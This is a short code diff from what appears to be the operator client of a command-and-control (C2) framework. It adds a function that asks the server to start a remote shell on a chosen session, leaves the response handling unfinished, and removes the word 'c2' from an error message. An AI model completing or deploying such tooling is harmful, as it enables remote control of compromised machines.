@@ -63,18 +63,34 @@ def receive_sessions(operator_socket): # deserialize sessionInfo bytes and displ
 
 
 
-def connect(command):
+def start_shell(command, session_id):
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as operator_socket:
+        try:
+            operator_socket.connect((TARGET_IP, TARGET_PORT))
+            packet_bytes = protocol.packet_formation(protocol.MESSAGE_SHELL_START, session_id, command)
+            operator_socket.sendall(packet_bytes)
+            # NOW NEED TO RECEIVE SERVER RESPONSE HERE
+            ##################
+            ##################
+            ##################
+        except OSError as e:
+            operator_socket.close()
+            return False
+
+
+
+def sessions(command):
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as operator_socket:
         try:
             operator_socket.connect((TARGET_IP, TARGET_PORT))
             #print(f"[+] operator connected to server successfully")
-            packet_bytes = protocol.packet_formation(protocol.MESSAGE_COMMAND, 0, command) # 0 because we are just typing "sessions" command and not choosing any active session so...
-            operator_socket.sendall(packet_bytes)
             while True:
                 if command == "sessions":
+                    packet_bytes = protocol.packet_formation(protocol.MESSAGE_COMMAND, 0, command) # 0 because we are just typing "sessions" command and not choosing any active session so...
+                    operator_socket.sendall(packet_bytes)
                     session_info, sessionCount = receive_sessions(operator_socket) # passing operator socket and 4 bytes cuz number of session ids are 4 bytes
                     console.display_sessionInfo(session_info, sessionCount)
                     return session_info
         except OSError as e:
-            print(f"{colors.Fore.RED}[!] couldn't connect to c2 server\n")
+            print(f"{colors.Fore.RED}[!] couldn't connect to server\n")
             operator_socket.close()
